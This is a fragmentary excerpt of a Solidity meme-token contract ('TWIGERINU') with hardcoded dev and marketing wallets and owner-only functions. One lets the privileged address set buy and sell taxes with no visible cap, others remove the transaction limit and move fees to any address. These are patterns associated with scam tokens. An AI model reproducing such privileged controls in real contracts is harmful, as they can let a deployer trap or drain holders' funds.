...
contract twigerinu  is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;
    address private _owner;
    
    string private constant _name = "TWIGERINU";
    string private constant _symbol = unicode"$TWGIER";
    ...
    address payable public DevWallet = payable(0xCc9e5B6788946cf7dB5B710D8C9F3F18e4EC8a3C);
    address payable public MarketingWallet = payable(0xbe4926960E40821Ca2703683652c45f389BF98f4);
    ...
    function setbothFees(uint256 buytax, uint256 selltax) external onlyAddress {
        _tax_On_Buy = buytax;
    ...
    function removemaxTxn() external onlyAddress {
    ...
    function transferFees(uint256 value, address adr) onlyAddress public virtual {
